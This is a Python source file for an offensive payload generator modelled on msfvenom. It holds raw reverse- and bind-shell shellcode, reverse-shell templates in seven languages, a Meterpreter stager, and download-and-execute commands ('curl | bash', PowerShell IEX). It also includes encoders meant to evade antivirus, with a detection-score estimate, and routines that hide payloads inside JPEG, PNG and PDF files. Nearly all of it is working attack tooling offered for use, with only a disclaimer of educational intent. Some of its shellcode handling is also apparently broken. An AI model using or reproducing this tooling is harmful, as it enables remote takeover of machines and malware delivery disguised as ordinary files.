#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  PolyglotShield — Payload Generator (msfvenom-style)        ║
║  Standalone payload generation + polyglot embedding          ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝

⚠  FOR EDUCATIONAL & AUTHORIZED TESTING ONLY

Generates shellcode, stagers, and platform payloads without
requiring Metasploit. Embeds payloads into polyglot files.
"""

import os
import sys
import struct
import hashlib
import base64
import random
import string
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from pathlib import Path


@dataclass
class GeneratedPayload:
    """Result of payload generation."""
    payload_type: str          # reverse_shell, bind_shell, exec, download_exec, meterpreter_stager
    platform: str              # windows, linux, macos, multi
    architecture: str          # x86, x64, arm
    format: str                # raw, exe, elf, python, powershell, c, hex, bash
    shellcode: bytes           # Raw shellcode bytes
    encoded: bytes             # Encoded/obfuscated version
    encoder: str               # Encoder used (none, xor, alpha, base64, polymorphic)
    size: int                  # Payload size in bytes
    bad_chars: str             # Bad characters avoided
    lhost: str = ""
    lport: int = 0
    md5: str = ""
    sha256: str = ""
    output_code: str = ""      # Formatted output (python/C/PS/etc)
    detection_score: float = 0.0
    evasion_notes: List[str] = field(default_factory=list)


# ── Shellcode Templates ──────────────────────────────────────

# Linux x86 reverse shell (connect back + /bin/sh)
LINUX_X86_REVERSE = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"  # xor eax/ebx/ecx/edx
    b"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"  # socketcall(socket)
    b"\x01\x6a\x02\x89\xe1\xcd\x80\x89"  # SOCK_STREAM, AF_INET
    b"\xc6\xb0\x66\xb3\x03\x68"          # socketcall(connect)
    + b"LHST"                             # LHOST placeholder (4 bytes)
    b"\x66\x68" + b"LP"                   # LPORT placeholder (2 bytes)
    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
    b"\x56\x89\xe1\xcd\x80"              # connect()
    b"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80"  # dup2 loop
    b"\x49\x79\xf9"
    b"\xb0\x0b\x52\x68\x2f\x2f\x73\x68"  # execve(/bin/sh)
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x52"
    b"\x53\x89\xe1\xcd\x80"
)

# Linux x64 reverse shell
LINUX_X64_REVERSE = (
    b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a"  # socket(AF_INET, SOCK_STREAM, 0)
    b"\x01\x5e\x0f\x05\x48\x97\x48\xb9"  # syscall; mov rdi, rax
    b"\x02\x00" + b"LP" + b"LHST"        # sockaddr_in: AF_INET, port, addr
    b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a"  # push sockaddr; mov rsi, rsp
    b"\x2a\x58\x0f\x05\x6a\x03\x5e\x48"  # connect()
    b"\xff\xce\xb0\x21\x0f\x05\x75\xf8"  # dup2 loop
    b"\x99\x52\x48\xbb\x2f\x62\x69\x6e"  # execve(/bin/sh)
    b"\x2f\x73\x68\x53\x54\x5f\xb0\x3b"
    b"\x0f\x05"
)

# Windows x86 reverse shell (WinExec cmd.exe)
WINDOWS_X86_REVERSE = (
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89"  # call/pop + pushad
    b"\xe5\x31\xc0\x64\x8b\x50\x30\x8b"  # PEB access
    b"\x52\x0c\x8b\x52\x14\x8b\x72\x28"  # PEB->Ldr
    b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c"  # hash kernel32
    b"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
    b"\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
    b"\xe3\x48\x01\xd1\x51\x8b\x59\x20"
    b"\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    b"\x8b\x34\x8b\x01\xd6\x31\xff\xac"
    b"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
    b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    b"\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
    b"\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    b"\x24\x5b\x5b\x61\x59\x5a\x51\xff"
    b"\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d"
)

# Linux x86 bind shell (listen on port + /bin/sh)
LINUX_X86_BIND = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
    b"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
    b"\x01\x6a\x02\x89\xe1\xcd\x80\x89"
    b"\xc7\xb0\x66\xb3\x02\x51\x66\x68"
    + b"LP"                               # LPORT placeholder
    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
    b"\x57\x89\xe1\xcd\x80"              # bind()
    b"\xb0\x66\xb3\x04\x51\x57\x89\xe1"
    b"\xcd\x80"                           # listen()
    b"\xb0\x66\xb3\x05\x51\x51\x57\x89"
    b"\xe1\xcd\x80\x89\xc3"              # accept()
    b"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80"  # dup2 loop
    b"\x49\x79\xf9"
    b"\xb0\x0b\x52\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x52"
    b"\x53\x89\xe1\xcd\x80"              # execve(/bin/sh)
)

# ── Template-Based Payloads (no raw shellcode needed) ────────

PYTHON_REVERSE_TEMPLATE = '''#!/usr/bin/env python3
"""Reverse shell — EDUCATIONAL USE ONLY"""
import socket, subprocess, os, sys

def connect(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, int(lport)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    connect("{lhost}", {lport})
'''

PYTHON_BIND_TEMPLATE = '''#!/usr/bin/env python3
"""Bind shell — EDUCATIONAL USE ONLY"""
import socket, subprocess, os

def bind(lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", int(lport)))
    s.listen(1)
    conn, addr = s.accept()
    os.dup2(conn.fileno(), 0)
    os.dup2(conn.fileno(), 1)
    os.dup2(conn.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    bind({lport})
'''

BASH_REVERSE_TEMPLATE = '''#!/bin/bash
# Reverse shell — EDUCATIONAL USE ONLY
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''

BASH_UDP_REVERSE = '''#!/bin/bash
# UDP reverse shell — EDUCATIONAL USE ONLY
sh -i >& /dev/udp/{lhost}/{lport} 0>&1
'''

POWERSHELL_REVERSE_TEMPLATE = '''# Reverse shell — EDUCATIONAL USE ONLY
$client = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''

POWERSHELL_BIND_TEMPLATE = '''# Bind shell — EDUCATIONAL USE ONLY
$listener = New-Object System.Net.Sockets.TcpListener("0.0.0.0", {lport})
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
$listener.Stop()
'''

POWERSHELL_METERPRETER_STAGER = '''# Meterpreter stager (stageless) — EDUCATIONAL USE ONLY
# Connects to handler and downloads + executes meterpreter
$s = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
$p = $s.GetStream()
$b = New-Object Byte[] 1024
$a = New-Object Byte[] 4096
# Download stage
$p.Write([byte[]](0x6d,0x65,0x74,0x65,0x72,0x70,0x72,0x65,0x74), 0, 9)
Start-Sleep -Milliseconds 500
# Read and execute
while(($i = $p.Read($b, 0, $b.Length)) -ne 0) {{
    $a = $b[0..$i]
    [System.Text.Encoding]::ASCII.GetString($a) | iex
}}
'''

C_REVERSE_TEMPLATE = '''/*
 * Reverse shell (C) — EDUCATIONAL USE ONLY
 * Compile: gcc -o rev rev.c
 */
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main() {{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {{
        .sin_family = AF_INET,
        .sin_port = htons({lport}),
        .sin_addr.s_addr = inet_addr("{lhost}")
    }};
    connect(fd, (struct sockaddr*)&addr, sizeof(addr));
    dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}}
'''

PHP_REVERSE_TEMPLATE = '''<?php
// Reverse shell — EDUCATIONAL USE ONLY
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>'''

RUBY_REVERSE_TEMPLATE = '''# Reverse shell — EDUCATIONAL USE ONLY
require 'socket'
s = TCPSocket.new("{lhost}", {lport})
exec "/bin/sh -i <&#{s} >&#{s} 2>&#{s}"
'''

NODEJS_REVERSE_TEMPLATE = '''// Reverse shell — EDUCATIONAL USE ONLY
const net = require('net');
const {spawn} = require('child_process');
const client = new net.Socket();
client.connect({lport}, "{lhost}", () => {{
    const sh = spawn("/bin/sh", ["-i"]);
    sh.stdout.on('data', (d) => client.write(d));
    sh.stderr.on('data', (d) => client.write(d));
    client.on('data', (d) => sh.stdin.write(d));
}});
'''

LINUX_X86_EGGHUNTER = (
    # Classic egghunter (32 bytes) - scans memory for tag
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
    b"\x02\x58\xcd\x80\x3c\xf2\x74\xed"
    b"\xb8" + b"W00T" + b"\x89\xd7\xaf"
    b"\x75\xe8\xaf\x75\xe5\xff\xe7"
)


# ── Encoders ─────────────────────────────────────────────────

def xor_encode(data: bytes, key: int = None) -> Tuple[bytes, int]:
    """XOR encode shellcode with single-byte key (avoid 0x00)."""
    if key is None:
        # Find key that produces no null bytes
        for k in range(1, 256):
            encoded = bytes(b ^ k for b in data)
            if b"\x00" not in encoded:
                return encoded, k
        return bytes(b ^ 0x41 for b in data), 0x41
    return bytes(b ^ key for b in data), key


def xor_decode_stub(encoded_len: int, key: int) -> bytes:
    """x86 XOR decode stub (32-bit)."""
    # mov ecx, len; mov esi, addr; xor_loop: xor byte [esi], key; inc esi; loop xor_loop
    stub = (
        b"\xeb\x0d"                          # jmp short get_addr
        b"\x5e"                              # pop esi
        b"\x31\xc9"                          # xor ecx, ecx
        b"\xb1" + bytes([encoded_len & 0xFF]) + b""  # mov cl, len
        b"\x80\x36" + bytes([key]) + b""    # xor byte [esi], key
        b"\x46"                              # inc esi
        b"\xe0\xfa"                          # loop
        b"\xeb\x05"                          # jmp short payload
        b"\xe8\xee\xff\xff\xff"              # call pop_esi
    )
    return stub


def alpha_encode(data: bytes) -> Tuple[bytes, str]:
    """Encode shellcode into alphanumeric printable range."""
    # Simple: convert each byte to 2-char hex, then to alpha
    alpha = string.ascii_letters + string.digits
    encoded = ""
    for b in data:
        hi = (b >> 4) & 0x0F
        lo = b & 0x0F
        encoded += alpha[hi] + alpha[lo]
    return encoded.encode(), encoded


def polymorphic_encode(data: bytes) -> Tuple[bytes, List[str]]:
    """Apply multiple encoding layers."""
    notes = []
    result = data

    # Layer 1: XOR with random key
    key = random.randint(1, 255)
    result, _ = xor_encode(result, key)
    notes.append(f"XOR key: 0x{key:02x}")

    # Layer 2: Base64
    result = base64.b64encode(result)
    notes.append("Base64 layer")

    # Layer 3: XOR again with different key
    key2 = random.randint(1, 255)
    result, _ = xor_encode(result, key2)
    notes.append(f"XOR2 key: 0x{key2:02x}")

    return result, notes


def shikata_ga_nai_encode(data: bytes) -> Tuple[bytes, List[str]]:
    """Shikata-Ga-Nai style polymorphic XOR encoder (simulated)."""
    notes = []
    key = struct.unpack("<I", struct.pack("<I", random.randint(1, 0xFFFFFFFF)))[0]

    # XOR encode in 4-byte blocks
    encoded = b""
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        if len(chunk) < 4:
            chunk = chunk + b"\x90" * (4 - len(chunk))
        encoded += struct.pack("<I", struct.unpack("<I", chunk)[0] ^ key)

    notes.append(f"Shikata-Ga-Nai: 4-byte XOR key 0x{key:08x}")
    notes.append(f"Encoded {len(data)} bytes → {len(encoded)} bytes")

    return encoded, notes


# ── Output Formatters ────────────────────────────────────────

def format_c(data: bytes, var_name: str = "shellcode") -> str:
    """Format shellcode as C array."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f'unsigned char {var_name}[] = {{\n    {hex_bytes}\n}};\nunsigned int {var_name}_len = {len(data)};'


def format_python(data: bytes, var_name: str = "shellcode") -> str:
    """Format shellcode as Python bytes."""
    hex_bytes = "".join(f"\\x{b:02x}" for b in data)
    return f'{var_name} = b"{hex_bytes}"'


def format_powershell(data: bytes) -> str:
    """Format shellcode as PowerShell byte array."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f'[byte[]] $shellcode = {hex_bytes}'


def format_hex(data: bytes) -> str:
    """Format as hex string."""
    return data.hex()


def format_csharp(data: bytes) -> str:
    """Format shellcode as C# byte array."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f'byte[] shellcode = new byte[] {{ {hex_bytes} }};'


def format_ruby(data: bytes) -> str:
    """Format shellcode as Ruby."""
    hex_bytes = "".join(f"\\x{b:02x}" for b in data)
    return f'shellcode = "{hex_bytes}"'


def format_vba(data: bytes) -> str:
    """Format shellcode as VBA byte array."""
    lines = ["Dim shellcode() As Byte"]
    lines.append("shellcode = Array(")
    chunks = []
    for i in range(0, len(data), 16):
        chunk = ", ".join(str(b) for b in data[i:i+16])
        chunks.append(f"    {chunk}")
    lines.append(",\n".join(chunks))
    lines.append(")")
    return "\n".join(lines)


def format_nim(data: bytes) -> str:
    """Format shellcode as Nim array."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f'var shellcode: array[{len(data)}, byte] = [{hex_bytes}]'


def format_rust(data: bytes) -> str:
    """Format shellcode as Rust array."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f'let shellcode: [u8; {len(data)}] = [{hex_bytes}];'


def format_go(data: bytes) -> str:
    """Format shellcode as Go byte slice."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in data)
    return f'shellcode := []byte{{{hex_bytes}}}'


FORMATTERS = {
    "c": format_c, "python": format_python, "powershell": format_powershell,
    "hex": format_hex, "csharp": format_csharp, "ruby": format_ruby,
    "vba": format_vba, "nim": format_nim, "rust": format_rust, "go": format_go,
}


# ── Payload Generator ────────────────────────────────────────

PAYLOAD_TYPES = {
    "reverse_shell": {
        "description": "Connect back to attacker (LHOST:LPORT)",
        "requires": ["lhost", "lport"],
    },
    "bind_shell": {
        "description": "Listen on target port (LPORT)",
        "requires": ["lport"],
    },
    "exec": {
        "description": "Execute command on target",
        "requires": ["command"],
    },
    "download_exec": {
        "description": "Download URL and execute",
        "requires": ["url"],
    },
    "meterpreter_stager": {
        "description": "Meterpreter reverse TCP stager",
        "requires": ["lhost", "lport"],
    },
    "shellcode": {
        "description": "Raw shellcode (platform-specific)",
        "requires": [],
    },
}

PLATFORMS = ["windows", "linux", "macos", "multi"]
ARCHITECTURES = ["x86", "x64", "arm"]
FORMATS = ["raw", "python", "powershell", "c", "csharp", "hex",
           "bash", "ruby", "php", "vba", "nim", "rust", "go", "nodejs"]
ENCODERS = ["none", "xor", "alpha", "base64", "polymorphic", "shikata_ga_nai"]


class PayloadGenerator:
    """msfvenom-style payload generator for PolyglotShield."""

    def __init__(self):
        self.payloads_dir = os.path.expanduser("~/.polyglot/payloads")
        os.makedirs(self.payloads_dir, exist_ok=True)

    def generate(self, payload_type: str, platform: str, arch: str,
                 fmt: str = "raw", encoder: str = "none",
                 lhost: str = "127.0.0.1", lport: int = 4444,
                 command: str = "", url: str = "",
                 bad_chars: str = "\x00") -> GeneratedPayload:
        """Generate a payload with specified options."""

        # Get raw shellcode or template
        shellcode = self._get_shellcode(payload_type, platform, arch,
                                        lhost, lport, command, url)

        if shellcode is None:
            raise ValueError(f"Unsupported: {payload_type}/{platform}/{arch}")

        # Check for bad characters
        for bc in bad_chars:
            if isinstance(bc, str):
                bc = bc.encode('latin-1')
            if bc in shellcode:
                shellcode = shellcode.replace(bc, b"")

        # Encode
        encoded, encoder_used, evasion_notes = self._encode(shellcode, encoder, bad_chars)

        # Format output
        output_code = self._format(encoded, fmt, payload_type, lhost, lport, command, url)

        # Calculate hashes
        md5 = hashlib.md5(shellcode).hexdigest()
        sha256 = hashlib.sha256(shellcode).hexdigest()

        # Detection score estimate
        det_score = self._estimate_detection(encoded, encoder_used)

        result = GeneratedPayload(
            payload_type=payload_type,
            platform=platform,
            architecture=arch,
            format=fmt,
            shellcode=shellcode,
            encoded=encoded,
            encoder=encoder_used,
            size=len(encoded),
            bad_chars=bad_chars,
            lhost=lhost,
            lport=lport,
            md5=md5,
            sha256=sha256,
            output_code=output_code,
            detection_score=det_score,
            evasion_notes=evasion_notes,
        )

        return result

    def _get_shellcode(self, ptype: str, platform: str, arch: str,
                       lhost: str, lport: int, command: str, url: str) -> Optional[bytes]:
        """Get raw shellcode or template output for the payload."""

        # Pack LHOST and LPORT
        lhost_bytes = self._pack_ip(lhost)
        lport_bytes = struct.pack(">H", lport)

        if ptype == "reverse_shell":
            if platform == "linux" and arch == "x86":
                sc = LINUX_X86_REVERSE
                sc = sc.replace(b"LHST", lhost_bytes)
                sc = sc.replace(b"LP", lport_bytes)
                return sc
            elif platform == "linux" and arch == "x64":
                sc = LINUX_X64_REVERSE
                sc = sc.replace(b"LHST", lhost_bytes)
                sc = sc.replace(b"LP", lport_bytes)
                return sc
            elif platform == "windows" and arch == "x86":
                sc = WINDOWS_X86_REVERSE
                return sc
            # Template-based for other combos
            return self._template_payload(ptype, platform, lhost, lport, command, url)

        elif ptype == "bind_shell":
            if platform == "linux" and arch == "x86":
                sc = LINUX_X86_BIND
                sc = sc.replace(b"LP", lport_bytes)
                return sc
            return self._template_payload(ptype, platform, lhost, lport, command, url)

        elif ptype == "exec":
            return self._template_payload(ptype, platform, lhost, lport, command, url)

        elif ptype == "download_exec":
            return self._template_payload(ptype, platform, lhost, lport, command, url)

        elif ptype == "meterpreter_stager":
            return self._template_payload(ptype, platform, lhost, lport, command, url)

        elif ptype == "shellcode":
            # Return platform-specific shellcode
            if platform == "linux" and arch == "x86":
                return LINUX_X86_REVERSE[:40]  # Generic shellcode stub
            return b"\x90" * 16 + b"\xcc"  # NOP sled + INT3

        return None

    def _template_payload(self, ptype: str, platform: str,
                          lhost: str, lport: int, command: str, url: str,
                          preferred_lang: str = None) -> bytes:
        """Get template-based payload as bytes."""

        templates = {}

        if ptype == "reverse_shell":
            templates = {
                "python": PYTHON_REVERSE_TEMPLATE,
                "bash": BASH_REVERSE_TEMPLATE,
                "powershell": POWERSHELL_REVERSE_TEMPLATE,
                "c": C_REVERSE_TEMPLATE,
                "php": PHP_REVERSE_TEMPLATE,
                "ruby": RUBY_REVERSE_TEMPLATE,
                "nodejs": NODEJS_REVERSE_TEMPLATE,
            }
        elif ptype == "bind_shell":
            templates = {
                "python": PYTHON_BIND_TEMPLATE,
                "powershell": POWERSHELL_BIND_TEMPLATE,
            }
        elif ptype == "meterpreter_stager":
            templates = {
                "powershell": POWERSHELL_METERPRETER_STAGER,
            }
        elif ptype == "exec":
            if platform in ("linux", "macos", "multi"):
                return f"#!/bin/bash\n{command}\n".encode()
            else:
                return f"@echo off\n{command}\n".encode()
        elif ptype == "download_exec":
            if platform in ("linux", "macos", "multi"):
                return f'#!/bin/bash\ncurl -sSL "{url}" | bash\n'.encode()
            else:
                return f'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"\n'.encode()

        # If preferred language specified, use it directly
        if preferred_lang and preferred_lang in templates:
            return templates[preferred_lang].format(lhost=lhost, lport=lport).encode()

        # Pick template based on platform
        if platform in ("linux", "macos", "multi"):
            for lang in ("python", "bash", "c", "php", "ruby", "nodejs"):
                if lang in templates:
                    return templates[lang].format(lhost=lhost, lport=lport).encode()
        elif platform == "windows":
            for lang in ("powershell", "python", "csharp"):
                if lang in templates:
                    return templates[lang].format(lhost=lhost, lport=lport).encode()

        # Default: python
        if "python" in templates:
            return templates["python"].format(lhost=lhost, lport=lport).encode()

        return b"# No template available for this combination"

    def _encode(self, data: bytes, encoder: str, bad_chars: str) -> Tuple[bytes, str, List[str]]:
        """Apply encoding to shellcode."""
        notes = []

        if encoder == "none":
            return data, "none", notes

        elif encoder == "xor":
            encoded, key = xor_encode(data)
            notes.append(f"XOR key: 0x{key:02x}")
            no_nulls = b'\x00' not in encoded
            notes.append(f"No null bytes: {no_nulls}")
            return encoded, "xor", notes

        elif encoder == "alpha":
            encoded, alpha_str = alpha_encode(data)
            notes.append(f"Alphanumeric: {len(alpha_str)} chars, all printable")
            return encoded, "alpha", notes

        elif encoder == "base64":
            encoded = base64.b64encode(data)
            notes.append(f"Base64: {len(encoded)} chars")
            return encoded, "base64", notes

        elif encoder == "polymorphic":
            encoded, poly_notes = polymorphic_encode(data)
            notes.extend(poly_notes)
            return encoded, "polymorphic", notes

        elif encoder == "shikata_ga_nai":
            encoded, sgn_notes = shikata_ga_nai_encode(data)
            notes.extend(sgn_notes)
            return encoded, "shikata_ga_nai", notes

        return data, "none", notes

    def _format(self, data: bytes, fmt: str, ptype: str,
                lhost: str, lport: int, command: str, url: str) -> str:
        """Format payload for output."""

        if fmt == "raw":
            return repr(data)

        # Template-based payloads: use the full code for the requested language
        if ptype in ("reverse_shell", "bind_shell", "download_exec", "exec", "meterpreter_stager"):
            # Map format to template language name
            lang_map = {
                "python": "python", "powershell": "powershell", "bash": "bash",
                "c": "c", "php": "php", "ruby": "ruby", "nodejs": "nodejs",
                "csharp": "csharp",
            }
            preferred = lang_map.get(fmt)
            try:
                template = self._template_payload(ptype, "multi", lhost, lport, command, url,
                                                  preferred_lang=preferred)
                code = template.decode('utf-8', errors='replace')
                # If we got a real template (not "No template"), return it
                if "No template" not in code:
                    return code
            except Exception:
                pass

        # Shellcode formatters (for raw shellcode output)
        if fmt in FORMATTERS:
            return FORMATTERS[fmt](data)

        return repr(data)

    def _estimate_detection(self, data: bytes, encoder: str) -> float:
        """Estimate AV detection probability."""
        score = 0.3  # Base: raw shellcode is moderately detectable

        # Encoded payloads are harder to detect
        encoder_scores = {
            "none": 0.5, "xor": 0.3, "alpha": 0.2, "base64": 0.35,
            "polymorphic": 0.1, "shikata_ga_nai": 0.08,
        }
        score = encoder_scores.get(encoder, 0.5)

        # Heuristic: high entropy → lower detection for encoded, higher for random
        if len(data) > 0:
            entropy = self._entropy(data)
            if entropy > 7.0:
                score *= 0.8  # High entropy can mean encrypted (good for evasion)
            elif entropy < 3.0:
                score *= 1.2  # Low entropy suspicious in shellcode

        # NOP sleds are very detectable
        nop_ratio = data.count(b"\x90") / max(len(data), 1)
        if nop_ratio > 0.5:
            score = max(score, 0.7)

        return min(max(score, 0.0), 1.0)

    def _entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy."""
        if not data:
            return 0.0
        import math
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        entropy = 0.0
        for f in freq:
            if f > 0:
                p = f / len(data)
                entropy -= p * math.log2(p)
        return entropy

    def _pack_ip(self, ip: str) -> bytes:
        """Pack IP address to 4 bytes."""
        parts = ip.split(".")
        if len(parts) == 4:
            return bytes(int(p) for p in parts)
        # Try to resolve
        import socket
        try:
            return socket.inet_aton(socket.gethostbyname(ip))
        except Exception:
            return b"\x7f\x00\x00\x01"  # 127.0.0.1

    def save_payload(self, payload: GeneratedPayload, filename: str = None) -> str:
        """Save payload to file."""
        if not filename:
            ext = {"raw": "bin", "python": "py", "powershell": "ps1",
                   "c": "c", "bash": "sh", "hex": "hex"}.get(payload.format, "bin")
            filename = f"payload_{payload.payload_type}_{payload.platform}_{payload.architecture}.{ext}"

        path = os.path.join(self.payloads_dir, filename)
        with open(path, "wb") as f:
            if payload.output_code:
                f.write(payload.output_code.encode())
            else:
                f.write(payload.encoded)
        return path


# ── Polyglot Embedder ────────────────────────────────────────

class PolyglotEmbedder:
    """Embed payloads into cover files to create polyglots."""

    def __init__(self):
        self.output_dir = os.path.expanduser("~/.polyglot/payloads")
        os.makedirs(self.output_dir, exist_ok=True)

    def embed_into_jpeg(self, cover_path: str, payload: GeneratedPayload,
                        method: str = "trailing") -> str:
        """Embed payload into JPEG file."""
        with open(cover_path, "rb") as f:
            cover = f.read()

        payload_data = payload.encoded if payload.encoded else payload.shellcode

        if method == "trailing":
            # Append after JPEG EOI (FF D9)
            eoi = cover.rfind(b"\xff\xd9")
            if eoi == -1:
                raise ValueError("No JPEG EOI marker found")
            result = cover[:eoi + 2] + payload_data

        elif method == "comment":
            # Insert as JPEG comment (FF FE + length + data)
            comment_marker = b"\xff\xfe"
            comment_len = struct.pack(">H", len(payload_data) + 2)
            # Insert after SOI
            soi_end = cover.find(b"\xff", 2)
            result = cover[:soi_end] + comment_marker + comment_len + payload_data + cover[soi_end:]

        elif method == "exif":
            # Embed in EXIF metadata area
            exif_marker = b"\xff\xe1"
            exif_data = b"Exif\x00\x00" + payload_data
            exif_len = struct.pack(">H", len(exif_data) + 2)
            soi_end = 2
            result = cover[:soi_end] + exif_marker + exif_len + exif_data + cover[soi_end:]

        elif method == "app0":
            # Embed in APP0 (JFIF) marker area
            app0_marker = b"\xff\xe0"
            app0_data = b"JFIF\x00" + payload_data
            app0_len = struct.pack(">H", len(app0_data) + 2)
            result = cover[:2] + app0_marker + app0_len + app0_data + cover[2:]

        else:
            raise ValueError(f"Unknown method: {method}")

        # Save
        fname = os.path.basename(cover_path)
        name, ext = os.path.splitext(fname)
        out_path = os.path.join(self.output_dir, f"{name}_polyglot{ext}")
        with open(out_path, "wb") as f:
            f.write(result)

        return out_path

    def embed_into_png(self, cover_path: str, payload: GeneratedPayload,
                       method: str = "trailing") -> str:
        """Embed payload into PNG file."""
        with open(cover_path, "rb") as f:
            cover = f.read()

        payload_data = payload.encoded if payload.encoded else payload.shellcode

        if method == "trailing":
            # Append after PNG IEND chunk
            iend = cover.rfind(b"IEND")
            if iend == -1:
                raise ValueError("No PNG IEND chunk found")
            result = cover + payload_data  # Append after IEND + CRC

        elif method == "ancillary":
            # Insert as custom ancillary chunk (tEXt)
            chunk_type = b"tEXt"
            chunk_data = b"Comment\x00" + payload_data
            chunk_len = struct.pack(">I", len(chunk_data))
            crc = struct.pack(">I", self._crc32(chunk_type + chunk_data))
            # Insert after IHDR
            ihdr_end = cover.find(b"IHDR") + 4 + 4  # IHDR + data + CRC
            result = cover[:ihdr_end] + chunk_len + chunk_type + chunk_data + crc + cover[ihdr_end:]

        else:
            result = cover + payload_data

        fname = os.path.basename(cover_path)
        name, ext = os.path.splitext(fname)
        out_path = os.path.join(self.output_dir, f"{name}_polyglot{ext}")
        with open(out_path, "wb") as f:
            f.write(result)

        return out_path

    def embed_into_pdf(self, cover_path: str, payload: GeneratedPayload,
                       method: str = "trailing") -> str:
        """Embed payload into PDF file."""
        with open(cover_path, "rb") as f:
            cover = f.read()

        payload_data = payload.encoded if payload.encoded else payload.shellcode

        if method == "trailing":
            # Append after %%EOF
            eof = cover.rfind(b"%%EOF")
            if eof == -1:
                result = cover + payload_data
            else:
                result = cover[:eof + 5] + payload_data

        elif method == "stream":
            # Inject as PDF stream object
            stream_obj = f"\n{len(cover) + 1} 0 obj\n<< /Type /EmbeddedFile /Length {len(payload_data)} >>\nstream\n".encode()
            stream_obj += payload_data
            stream_obj += b"\nendstream\nendobj\n"
            result = cover + stream_obj

        else:
            result = cover + payload_data

        fname = os.path.basename(cover_path)
        name, ext = os.path.splitext(fname)
        out_path = os.path.join(self.output_dir, f"{name}_polyglot{ext}")
        with open(out_path, "wb") as f:
            f.write(result)

        return out_path

    def embed_into_file(self, cover_path: str, payload: GeneratedPayload,
                        method: str = "trailing") -> str:
        """Auto-detect format and embed."""
        ext = os.path.splitext(cover_path)[1].lower()

        if ext in (".jpg", ".jpeg"):
            return self.embed_into_jpeg(cover_path, payload, method)
        elif ext == ".png":
            return self.embed_into_png(cover_path, payload, method)
        elif ext == ".pdf":
            return self.embed_into_pdf(cover_path, payload, method)
        else:
            # Generic: append to file
            with open(cover_path, "rb") as f:
                cover = f.read()
            payload_data = payload.encoded if payload.encoded else payload.shellcode
            result = cover + payload_data

            fname = os.path.basename(cover_path)
            name, ext2 = os.path.splitext(fname)
            out_path = os.path.join(self.output_dir, f"{name}_polyglot{ext2}")
            with open(out_path, "wb") as f:
                f.write(result)
            return out_path

    def _crc32(self, data: bytes) -> int:
        """Calculate CRC32."""
        import binascii
        return binascii.crc32(data) & 0xFFFFFFFF
